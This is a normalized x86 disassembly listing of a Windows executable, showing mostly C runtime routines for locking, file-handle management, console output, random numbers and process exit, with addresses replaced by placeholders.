je r-xdata
sub_40b485
push ebx
push ecx
mov ebx rw-data
mov ecx [ esp + 0xc ]
mov [ ebx + 0x8 ] ecx
mov [ ebx + 0x4 ] eax
mov [ ebx + 0xc ] ebp
push ebp
push ecx
push eax
pop eax
pop ecx
pop ebp
pop ecx
pop ebx
retn 0x4
sub_40b4a7
push 0x10
push r--data
call sub_405550
xor edi edi
mov [ ebp - 0x1c ] edi
push 0x1
call sub_406fa9
pop ecx
and [ ebp - 0x4 ] edi
push 0x3
pop esi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_40b53b
mov eax edi
call sub_405595
retn
mov eax [ rw-data ]
mov eax [ eax + esi * 4 ]
test eax eax
je r-xdata
inc esi
jmp r-xdata
test [ eax + 0xc ] 0x83
je r-xdata
mov [ ebp - 0x20 ] esi
cmp esi [ rw-data ]
jge r-xdata
cmp esi 0x14
jl r-xdata
push eax
call sub_40bb7e
pop ecx
cmp eax 0xffffffff
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + esi * 4 ]
add eax 0x20
push eax
call [ DeleteCriticalSection@IAT ]
mov eax [ rw-data ]
push [ eax + esi * 4 ]
call sub_404081
pop ecx
mov eax [ rw-data ]
and [ eax + esi * 4 ] 0x0
inc edi
mov [ ebp - 0x1c ] edi
sub_40b544
push 0x8
push r--data
call sub_405550
mov edi [ ebp + 0x8 ]
mov eax edi
sar eax 0x5
mov esi edi
and esi 0x1f
shl esi 0x6
add esi [ eax * 4 + rw-data ]
cmp [ esi + 0x8 ] 0x0
jne r-xdata
mov eax edi
sar eax 0x5
and edi 0x1f
shl edi 0x6
mov eax [ eax * 4 + rw-data ]
add eax 0xc
add eax edi
push eax
call [ EnterCriticalSection@IAT ]
xor eax eax
inc eax
call sub_405595
retn
push 0xa
call sub_406fa9
pop ecx
and [ ebp - 0x4 ] 0x0
cmp [ esi + 0x8 ] 0x0
jne r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_40b5c7
push 0xfa0
lea eax [ esi + 0xc ]
push eax
call [ InitializeCriticalSectionAndSpinCount@IAT ]
inc [ esi + 0x8 ]
sub_40b5d0
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
push edi
test eax eax
js r-xdata
call sub_4058af
mov [ eax ] 0x9
call sub_40587b
and [ eax ] 0x0
or eax 0xffffffff
cmp eax [ rw-data ]
jae r-xdata
mov edi eax
sar edi 0x5
mov esi eax
mov ecx [ edi * 4 + rw-data ]
and esi 0x1f
shl esi 0x6
test [ esi + ecx + 0x4 ] 0x1
je r-xdata
cmp [ esi + ecx ] 0xffffffff
je r-xdata
cmp [ rw-data ] 0x1
jne r-xdata
mov eax [ edi * 4 + rw-data ]
or [ esi + eax ] 0xffffffff
xor eax eax
jmp r-xdata
xor ecx ecx
sub eax ecx
je r-xdata
pop edi
pop esi
pop ebp
retn
push ecx
push 0xfffffff6
dec eax
je r-xdata
push ecx
push 0xfffffff5
jmp r-xdata
dec eax
jne r-xdata
call [ SetStdHandle@IAT ]
push ecx
push 0xfffffff4
jmp r-xdata
sub_40b656
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
cmp ecx 0xfffffffe
jne r-xdata
test ecx ecx
js r-xdata
call sub_40587b
and [ eax ] 0x0
call sub_4058af
mov [ eax ] 0x9
jmp r-xdata
call sub_40587b
and [ eax ] 0x0
call sub_4058af
mov [ eax ] 0x9
call sub_405a91
cmp ecx [ rw-data ]
jae r-xdata
or eax 0xffffffff
pop ebp
retn
mov eax ecx
sar eax 0x5
and ecx 0x1f
mov eax [ eax * 4 + rw-data ]
shl ecx 0x6
test [ eax + ecx + 0x4 ] 0x1
je r-xdata
mov eax [ eax + ecx ]
pop ebp
retn
sub_40b6bd
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
mov eax ecx
and ecx 0x1f
sar eax 0x5
shl ecx 0x6
mov eax [ eax * 4 + rw-data ]
add ecx 0xc
add eax ecx
push eax
call [ LeaveCriticalSection@IAT ]
pop ebp
retn
sub_40b6e3
push ebp
mov ebp esp
push ecx
mov eax [ rw-data ]
cmp eax 0xfffffffe
jne r-xdata
cmp eax 0xffffffff
jne r-xdata
call sub_40bc0c
mov eax [ rw-data ]
push 0x0
lea ecx [ ebp - 0x4 ]
push ecx
push 0x1
lea ecx [ ebp + 0x8 ]
push ecx
push eax
call [ WriteConsoleW@IAT ]
test eax eax
je r-xdata
mov eax 0xffff
leave
retn
mov ax [ ebp + 0x8 ]
leave
retn
sub_40b730
push ecx
lea ecx [ esp + 0x4 ]
sub ecx eax
sbb eax eax
not eax
and ecx eax
mov eax esp
and eax 0xfffff000
sub eax 0x1000
test [ eax ] eax
jmp r-xdata
mov eax ecx
pop ecx
xchg esp eax
mov eax [ eax ]
mov [ esp ] eax
retn
cmp ecx eax
jb r-xdata
sub_40b75b
push ebp
mov ebp esp
sub esp 0x10
push ebx
mov ebx [ ebp + 0xc ]
push edi
mov edi [ ebp + 0x10 ]
test ebx ebx
jne r-xdata
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
test edi edi
je r-xdata
push esi
cmp edi 0x7fffffff
jbe r-xdata
or [ eax ] 0xffffffff
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
push [ ebp + 0x18 ]
lea ecx [ ebp - 0x10 ]
call sub_405d89
mov eax [ ebp - 0x10 ]
xor esi esi
cmp [ eax + 0xa8 ] esi
jne r-xdata
call sub_4058af
push 0x16
pop esi
mov [ eax ] esi
call sub_405a91
jmp r-xdata
xor eax eax
jmp r-xdata
and [ eax ] 0x0
lea ecx [ ebp + 0xc ]
push ecx
push esi
push edi
push ebx
push 0x1
lea ecx [ ebp + 0x14 ]
push ecx
push esi
mov [ ebp + 0xc ] esi
push [ eax + 0x4 ]
call [ WideCharToMultiByte@IAT ]
mov ecx eax
test ecx ecx
je r-xdata
mov ax [ ebp + 0x14 ]
mov ecx 0xff
cmp ax cx
jbe r-xdata
mov eax esi
pop esi
pop edi
pop ebx
leave
retn
call [ GetLastError@IAT ]
cmp eax 0x7a
jne r-xdata
cmp [ ebp + 0xc ] esi
jne r-xdata
test ebx ebx
je r-xdata
test ebx ebx
je r-xdata
call sub_4058af
mov [ eax ] 0x2a
call sub_4058af
mov esi [ eax ]
test ebx ebx
je r-xdata
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
test edi edi
je r-xdata
test edi edi
je r-xdata
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
call sub_4058af
push 0x22
pop esi
mov [ eax ] esi
call sub_405a91
jmp r-xdata
test edi edi
je r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov [ eax ] ecx
jmp r-xdata
mov [ eax ] 0x1
jmp r-xdata
mov [ ebx ] al
push edi
push esi
push ebx
call sub_406ba0
add esp 0xc
push edi
push esi
push ebx
call sub_406ba0
add esp 0xc
sub_40b898
push ebp
mov ebp esp
push ecx
push esi
mov esi [ ebp + 0xc ]
push edi
push esi
call sub_408801
pop ecx
mov ecx [ esi + 0xc ]
mov edi eax
test cl 0x82
jne r-xdata
test cl 0x40
je r-xdata
call sub_4058af
mov [ eax ] 0x9
push ebx
xor ebx ebx
test cl 0x1
je r-xdata
call sub_4058af
mov [ eax ] 0x22
jmp r-xdata
pop edi
pop esi
leave
retn
mov eax [ esi + 0xc ]
and eax 0xffffffef
or eax 0x2
mov [ esi + 0xc ] eax
mov [ esi + 0x4 ] ebx
test eax 0x10c
jne r-xdata
mov [ esi + 0x4 ] ebx
test cl 0x10
je r-xdata
or [ esi + 0xc ] 0x20
mov eax 0xffff
jmp r-xdata
test [ esi + 0xc ] 0x108
je r-xdata
call sub_40865c
add eax 0x20
cmp esi eax
je r-xdata
or ecx 0x20
mov [ esi + 0xc ] ecx
jmp r-xdata
mov eax [ esi + 0x8 ]
and ecx 0xfffffffe
mov [ esi ] eax
mov [ esi + 0xc ] ecx
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x4 ] ax
push 0x2
lea eax [ ebp - 0x4 ]
push eax
push edi
mov [ ebp + 0xc ] 0x2
call sub_408879
mov ecx [ ebp + 0x8 ]
add esp 0xc
mov ebx eax
mov edx [ esi + 0x8 ]
mov ecx [ esi ]
lea eax [ edx + 0x2 ]
mov [ esi ] eax
mov eax [ esi + 0x18 ]
sub ecx edx
sub eax 0x2
mov [ ebp + 0xc ] ecx
mov [ esi + 0x4 ] eax
test ecx ecx
jle r-xdata
push edi
call sub_408825
pop ecx
test eax eax
jne r-xdata
call sub_40865c
add eax 0x40
cmp esi eax
jne r-xdata
mov eax 0xffff
jmp r-xdata
movzx eax cx
or [ esi + 0xc ] 0x20
cmp edi 0xffffffff
je r-xdata
push ecx
push edx
push edi
call sub_408879
add esp 0xc
mov ebx eax
jmp r-xdata
push esi
call sub_4092f2
pop ecx
pop ebx
mov ecx rw-data
cmp edi 0xfffffffe
je r-xdata
mov eax [ esi + 0x8 ]
mov ecx [ ebp + 0x8 ]
mov [ eax ] cx
jmp r-xdata
push 0x2
push ebx
push ebx
push edi
call sub_409185
and eax edx
add esp 0x10
cmp eax 0xffffffff
je r-xdata
mov ecx edi
mov eax edi
and ecx 0x1f
sar eax 0x5
shl ecx 0x6
add ecx [ eax * 4 + rw-data ]
jmp r-xdata
cmp ebx [ ebp + 0xc ]
je r-xdata
test [ ecx + 0x4 ] 0x20
je r-xdata
sub_40ba2c
push 0x14
push r--data
call sub_405550
mov edi [ ebp + 0x8 ]
cmp edi 0xfffffffe
jne r-xdata
test edi edi
js r-xdata
call sub_4058af
mov [ eax ] 0x9
jmp r-xdata
call sub_4058af
mov [ eax ] 0x9
call sub_405a91
cmp edi [ rw-data ]
jae r-xdata
or eax 0xffffffff
mov eax edi
sar eax 0x5
mov [ ebp - 0x20 ] eax
mov ebx edi
and ebx 0x1f
shl ebx 0x6
mov eax [ eax * 4 + rw-data ]
movsx eax [ ebx + eax + 0x4 ]
and eax 0x1
je r-xdata
push edi
call sub_40b544
pop ecx
xor esi esi
mov [ ebp - 0x4 ] esi
mov eax [ ebp - 0x20 ]
mov eax [ eax * 4 + rw-data ]
test [ ebx + eax + 0x4 ] 0x1
je r-xdata
call sub_4058af
mov [ eax ] 0x9
or esi 0xffffffff
mov [ ebp - 0x1c ] esi
push edi
call sub_40b656
pop ecx
push eax
call [ FlushFileBuffers@IAT ]
test eax eax
jne r-xdata
call sub_405595
retn
mov [ ebp - 0x1c ] esi
test esi esi
je r-xdata
call [ GetLastError@IAT ]
mov esi eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_40baf1
mov eax esi
jmp r-xdata
call sub_40587b
mov [ eax ] esi
sub_40bb12
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
push edi
or edi 0xffffffff
test esi esi
jne r-xdata
test [ esi + 0xc ] 0x83
je r-xdata
call sub_4058af
mov [ eax ] 0x16
call sub_405a91
or eax edi
jmp r-xdata
and [ esi + 0xc ] 0x0
mov eax edi
push esi
call sub_40b211
push esi
mov edi eax
call sub_40bd8f
push esi
call sub_408801
push eax
call sub_40bc2b
add esp 0x10
test eax eax
jns r-xdata
pop edi
pop esi
pop ebp
retn
cmp [ esi + 0x1c ] 0x0
je r-xdata
or edi 0xffffffff
jmp r-xdata
push [ esi + 0x1c ]
call sub_404081
and [ esi + 0x1c ] 0x0
pop ecx
sub_40bb7e
push 0xc
push r--data
call sub_405550
or edi 0xffffffff
mov [ ebp - 0x1c ] edi
xor eax eax
mov esi [ ebp + 0x8 ]
test esi esi
setne al
test eax eax
jne r-xdata
test [ esi + 0xc ] 0x40
je r-xdata
call sub_4058af
mov [ eax ] 0x16
call sub_405a91
push esi
call sub_408662
pop ecx
and [ ebp - 0x4 ] 0x0
push esi
call sub_40bb12
pop ecx
mov edi eax
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_40bbed
jmp r-xdata
and [ esi + 0xc ] 0x0
jmp r-xdata
mov eax edi
call sub_405595
retn
sub_40bc2b
push 0x10
push r--data
call sub_405550
mov esi [ ebp + 0x8 ]
cmp esi 0xfffffffe
jne r-xdata
test esi esi
js r-xdata
call sub_40587b
and [ eax ] 0x0
call sub_4058af
mov [ eax ] 0x9
jmp r-xdata
call sub_40587b
and [ eax ] 0x0
call sub_4058af
mov [ eax ] 0x9
call sub_405a91
cmp esi [ rw-data ]
jae r-xdata
or eax 0xffffffff
mov ebx esi
sar ebx 0x5
mov edi esi
and edi 0x1f
shl edi 0x6
mov eax [ ebx * 4 + rw-data ]
movsx eax [ eax + edi + 0x4 ]
and eax 0x1
je r-xdata
push esi
call sub_40b544
pop ecx
and [ ebp - 0x4 ] 0x0
mov eax [ ebx * 4 + rw-data ]
test [ eax + edi + 0x4 ] 0x1
je r-xdata
call sub_4058af
mov [ eax ] 0x9
or edi 0xffffffff
push esi
call sub_40bcf5
pop ecx
mov edi eax
jmp r-xdata
call sub_405595
retn
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_40bccc
mov eax edi
jmp r-xdata
sub_40bcf5
push ebp
mov ebp esp
push esi
push edi
mov edi [ ebp + 0x8 ]
push edi
call sub_40b656
pop ecx
cmp eax 0xffffffff
je r-xdata
xor esi esi
mov eax [ rw-data ]
cmp edi 0x1
jne r-xdata
xor eax eax
push esi
call sub_40588e
pop ecx
or eax 0xffffffff
jmp r-xdata
cmp edi 0x2
jne r-xdata
test [ eax + 0x84 ] 0x1
jne r-xdata
pop edi
pop esi
pop ebp
retn
push edi
call sub_40b656
pop ecx
push eax
call [ CloseHandle@IAT ]
test eax eax
jne r-xdata
test [ eax + 0x44 ] 0x1
je r-xdata
push 0x2
call sub_40b656
push 0x1
mov esi eax
call sub_40b656
pop ecx
pop ecx
cmp eax esi
je r-xdata
call [ GetLastError@IAT ]
mov esi eax
jmp r-xdata
push edi
call sub_40b5d0
pop ecx
mov ecx edi
sar ecx 0x5
and edi 0x1f
mov ecx [ ecx * 4 + rw-data ]
shl edi 0x6
mov [ ecx + edi + 0x4 ] 0x0
test esi esi
je r-xdata
sub_40bd8f
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
test [ esi + 0xc ] 0x83
je r-xdata
pop esi
pop ebp
retn
test [ esi + 0xc ] 0x8
je r-xdata
push [ esi + 0x8 ]
call sub_404081
and [ esi + 0xc ] 0xfffffbf7
xor eax eax
pop ecx
mov [ esi ] eax
mov [ esi + 0x8 ] eax
mov [ esi + 0x4 ] eax
sub_4023fd
or al 0xc
or al 0x9
or al 0xa
or al 0xb
int3
sub_402410
test ecx ecx
je r-xdata
xor al al
retn
push ecx
call [ GetFileAttributesW@IAT ]
cmp eax 0xffffffff
je r-xdata
test al 0x10
jne r-xdata
mov al 0x1
retn
sub_402ea0
mov eax 0x1
retn 0x4
sub_404004
mov ecx [ ebp - 0x14 ]
mov eax [ ecx ]
mov eax [ eax ]
mov [ ebp - 0x20 ] eax
push ecx
push eax
call sub_404456
pop ecx
pop ecx
retn
sub_404018
mov esp [ ebp - 0x18 ]
mov esi [ ebp - 0x20 ]
mov [ ebp - 0x24 ] esi
cmp [ ebp - 0x1c ] 0x0
jne r-xdata
call sub_404919
mov [ ebp - 0x4 ] 0xfffffffe
mov eax esi
call sub_405595
retn
push esi
call sub_4049c8
sub_404041
push ebp
mov ebp esp
cmp [ rw-data ] 0x2
je r-xdata
push [ ebp + 0x8 ]
call sub_404c04
push 0xff
call sub_4048e7
call sub_404ba7
_start
call sub_4053de
jmp sub_403eed
sub_40414b
push ebp
mov ebp esp
lea eax [ ebp + 0x14 ]
push eax
push 0x0
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_405d12
add esp 0x14
pop ebp
retn
sub_404167
push ebp
mov ebp esp
pop ebp
jmp sub_404184
sub_404170
push ebp
mov ebp esp
push 0xa
push 0x0
push [ ebp + 0x8 ]
call sub_4062d3
add esp 0xc
pop ebp
retn
sub_404184
push ebp
mov ebp esp
push 0xa
push 0x0
push [ ebp + 0x8 ]
call sub_405fed
add esp 0xc
pop ebp
retn
sub_404306
call sub_4046e8
mov ecx [ eax + 0x14 ]
imul ecx ecx 0x343fd
add ecx 0x269ec3
mov [ eax + 0x14 ] ecx
shr ecx 0x10
and ecx 0x7fff
mov eax ecx
retn
sub_404329
push ebp
mov ebp esp
call sub_4046e8
mov ecx [ ebp + 0x8 ]
mov [ eax + 0x14 ] ecx
pop ebp
retn
sub_404448
push sub_404407
call sub_406f70
pop ecx
xor eax eax
retn
sub_4046d3
push 0xd
call sub_40710d
pop ecx
retn
sub_4046df
push 0xc
call sub_40710d
pop ecx
retn
sub_404810
push 0xd
call sub_40710d
pop ecx
retn
sub_404819
push 0xc
call sub_40710d
pop ecx
retn
sub_404898
mov eax [ rw-data ]
cmp eax 0xffffffff
je r-xdata
jmp sub_406fdd
push eax
call sub_406c93
or [ rw-data ] 0xffffffff
pop ecx
sub_4048e7
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call sub_4048b5
pop ecx
push [ ebp + 0x8 ]
call [ ExitProcess@IAT ]
sub_4048fd
push ebp
mov ebp esp
call sub_404ba7
push [ ebp + 0x8 ]
call sub_404c04
pop ecx
push 0xff
call sub_4049c8
int3
sub_404919
push 0x1
push 0x1
push 0x0
call sub_404a64
add esp 0xc
retn
sub_404928
push 0x1
push 0x0
push 0x0
call sub_404a64
add esp 0xc
retn
sub_4049c8
push ebp
mov ebp esp
push 0x0
push 0x1
push [ ebp + 0x8 ]
call sub_404a64
add esp 0xc
pop ebp
retn
sub_404a52
push 0x8
call sub_406fa9
pop ecx
retn
sub_404a5b
push 0x8
call sub_40710d
pop ecx
retn
sub_404b7e
cmp [ ebp + 0x10 ] 0x0
je r-xdata
retn
push 0x8
call sub_40710d
pop ecx
sub_404b93
push ebp
mov ebp esp
push 0x0
push 0x0
push [ ebp + 0x8 ]
call sub_404a64
add esp 0xc
pop ebp
retn
sub_404dbf
call [ GetProcessHeap@IAT ]
xor ecx ecx
test eax eax
setne cl
mov [ rw-data ] eax
mov eax ecx
retn
sub_40507a
push 0xb
call sub_40710d
pop ecx
retn
sub_405391
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ rw-data ] eax
pop ebp
retn
sub_405595
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
push ecx
retn
sub_405929
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ rw-data ] eax
pop ebp
retn
sub_405a59
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ rw-data ] eax
pop ebp
retn
sub_405fed
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_405e11
add esp 0x10
pop ebp
retn
sub_406c30
push 0x8
push r--data
call sub_405550
call sub_4046e8
mov eax [ eax + 0x78 ]
test eax eax
je r-xdata
call sub_40a69e
and [ ebp - 0x4 ] 0x0
call eax
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
sub_406c50
xor eax eax
inc eax
retn
sub_406c64
push sub_406c30
call [ EncodePointer@IAT ]
mov [ rw-data ] eax
retn
sub_406c75
push ebp
mov ebp esp
mov eax [ rw-data ]
xor eax [ rw-data ]
je r-xdata
pop ebp
jmp [ TlsAlloc@IAT ]
push [ ebp + 0x8 ]
call eax
pop ebp
retn
sub_406c93
push ebp
mov ebp esp
mov eax [ rw-data ]
xor eax [ rw-data ]
push [ ebp + 0x8 ]
je r-xdata
call [ TlsFree@IAT ]
pop ebp
retn
call eax
pop ebp
retn
sub_406cb2
push ebp
mov ebp esp
mov eax [ rw-data ]
xor eax [ rw-data ]
push [ ebp + 0x8 ]
je r-xdata
call [ TlsGetValue@IAT ]
pop ebp
retn
call eax
pop ebp
retn
sub_406f70
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call [ SetUnhandledExceptionFilter@IAT ]
pop ebp
retn
sub_406f7e
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call [ GetCurrentProcess@IAT ]
push eax
call [ TerminateProcess@IAT ]
pop ebp
retn
sub_406f93
push ebp
mov ebp esp
push 0x0
call [ SetUnhandledExceptionFilter@IAT ]
push [ ebp + 0x8 ]
call [ UnhandledExceptionFilter@IAT ]
pop ebp
retn
sub_4070cf
push 0xa
call sub_40710d
pop ecx
retn
sub_40710d
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push [ eax * 8 + rw-data ]
call [ LeaveCriticalSection@IAT ]
pop ebp
retn
sub_4074f9
push 0xc
call sub_40710d
pop ecx
retn
sub_40754d
cmp [ rw-data ] 0x0
jne r-xdata
xor eax eax
retn
push 0xfffffffd
call sub_4078ad
pop ecx
mov [ rw-data ] 0x1
sub_4078a4
push 0xd
call sub_40710d
pop ecx
retn
sub_407a25
push 0xd
call sub_40710d
pop ecx
retn
sub_407d29
mov eax [ ebp - 0x14 ]
mov eax [ eax ]
xor ecx ecx
cmp [ eax ] 0xc0000005
sete cl
mov eax ecx
retn
sub_407dfa
call sub_404a5b
retn
sub_407eb6
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call sub_407dc0
neg eax
sbb eax eax
neg eax
pop ecx
dec eax
pop ebp
retn
sub_407ecb
push esi
xor esi esi
push [ esi + rw-data ]
call [ EncodePointer@IAT ]
mov [ esi + rw-data ] eax
add esi 0x4
cmp esi 0x28
jb r-xdata
pop esi
retn
sub_407eea
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ rw-data ] eax
pop ebp
retn
sub_407ef7
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ rw-data ] eax
pop ebp
retn
sub_407f04
push [ rw-data ]
call [ DecodePointer@IAT ]
retn
sub_407f11
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
pop ebp
retn
sub_4080a8
test ebx ebx
je r-xdata
retn
push 0x0
call sub_40710d
pop ecx
sub_4081ab
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov cx [ eax ]
add eax 0x2
test cx cx
jne r-xdata
sub eax [ ebp + 0x8 ]
sar eax 0x1
dec eax
pop ebp
retn
sub_408546
push ebp
mov ecx [ esp + 0x8 ]
mov ebp [ ecx ]
push [ ecx + 0x1c ]
push [ ecx + 0x18 ]
push [ ecx + 0x28 ]
call sub_408470
add esp 0xc
pop ebp
retn 0x4
sub_408579
mov ebp edx
mov esi ecx
mov eax ecx
push 0x1
call sub_40b485
xor eax eax
xor ebx ebx
xor ecx ecx
xor edx edx
xor edi edi
jmp esi
sub_4085ab
push ebp
mov ebp [ esp + 0x8 ]
push edx
push ecx
push [ esp + 0x14 ]
call sub_408470
add esp 0xc
pop ebp
retn 0x8
sub_408635
call sub_40b275
cmp [ rw-data ] 0x0
je r-xdata
push [ rw-data ]
call sub_404081
and [ rw-data ] 0x0
pop ecx
retn
call sub_40b4a7
sub_40878e
push ebp
mov ebp esp
push 0x4
push 0x0
push [ ebp + 0x8 ]
push 0x0
call sub_408738
add esp 0x10
pop ebp
retn
sub_4087f9
and [ rw-data ] 0x0
retn
sub_408932
push esi
call sub_40b6bd
pop ecx
retn
sub_409257
push edi
call sub_40b6bd
pop ecx
retn
sub_40a09d
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x8 ]
call sub_40a067
pop ecx
pop ecx
pop ebp
retn
sub_40a0ae
mov ecx [ rw-data ]
or ecx 0x1
xor eax eax
cmp [ rw-data ] ecx
sete al
retn
sub_40a33b
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_40a248
add esp 0x10
pop ebp
retn
sub_40a5cd
push 0xc
call sub_40710d
pop ecx
retn
sub_40b090
push 0x2
call sub_4048fd
sub_40b275
push 0x1
call sub_40b27e
pop ecx
retn
sub_40b326
mov eax [ rw-data ]
push [ eax + esi * 4 ]
push esi
call sub_40870b
pop ecx
pop ecx
retn
sub_40b359
push 0x1
call sub_40710d
pop ecx
retn
sub_40b459
xor eax eax
mov ecx [ fs : 0x0 ]
cmp [ ecx + 0x4 ] sub_40b390
jne r-xdata
retn
mov edx [ ecx + 0xc ]
mov edx [ edx + 0xc ]
cmp [ ecx + 0x8 ] edx
jne r-xdata
mov eax 0x1
sub_40b4a4
call eax
retn
sub_40b53b
push 0x1
call sub_40710d
pop ecx
retn
sub_40b5c7
push 0xa
call sub_40710d
pop ecx
retn
sub_40b87d
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_40b75b
add esp 0x14
pop ebp
retn
sub_40ba00
push ecx
lea ecx [ esp + 0x8 ]
sub ecx eax
and ecx 0xf
add eax ecx
sbb ecx ecx
or eax ecx
pop ecx
jmp sub_40b730
sub_40ba16
push ecx
lea ecx [ esp + 0x8 ]
sub ecx eax
and ecx 0x7
add eax ecx
sbb ecx ecx
or eax ecx
pop ecx
jmp sub_40b730
sub_40baf1
push edi
call sub_40b6bd
pop ecx
retn
sub_40bbed
push esi
call sub_4086d1
pop ecx
retn
sub_40bbf5
mov eax [ rw-data ]
cmp eax 0xffffffff
je r-xdata
retn
cmp eax 0xfffffffe
je r-xdata
push eax
call [ CloseHandle@IAT ]
sub_40bc0c
xor eax eax
push eax
push eax
push 0x3
push eax
push 0x3
push 0x40000000
push r--data
call [ CreateFileW@IAT ]
mov [ rw-data ] eax
retn
sub_40bccc
push esi
call sub_40b6bd
pop ecx
retn
IsProcessorFeaturePresent
jmp [ IsProcessorFeaturePresent@IAT ]
RtlUnwind
jmp [ RtlUnwind@IAT ]
